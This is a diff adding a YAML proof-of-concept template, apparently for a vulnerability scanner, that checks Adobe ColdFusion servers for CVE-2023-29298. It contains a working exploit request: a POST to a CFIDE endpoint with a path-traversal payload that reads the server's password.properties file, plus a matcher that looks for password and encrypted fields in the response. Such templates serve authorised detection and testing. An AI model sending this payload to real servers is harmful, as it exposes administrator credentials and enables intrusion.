@@ -1,0 +1,22 @@
+id: poc-yaml-adobe-coldfusion-access-control-bypass
+info:
+  name: Adobe ColdFusion 访问控制绕过
+  severity: high
+  tags:
+  - CVE-2023-29298
+  - 两高一弱
+  finger: Adobe ColdFusion
+requests:
+- method: POST
+  path: //CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _variables={"about":{"_metadata":{"classname":"\..\lib\password.properties"},"_variables":{}}}
+  expression: 'status_code == 200 && contains(body, "password=") && contains(body,
+    "encrypted=") &&
+
+    ( contains(body, "adobe") || contains(body, "coldfusion") )
+
+    '
+variables: {}
+transport: http
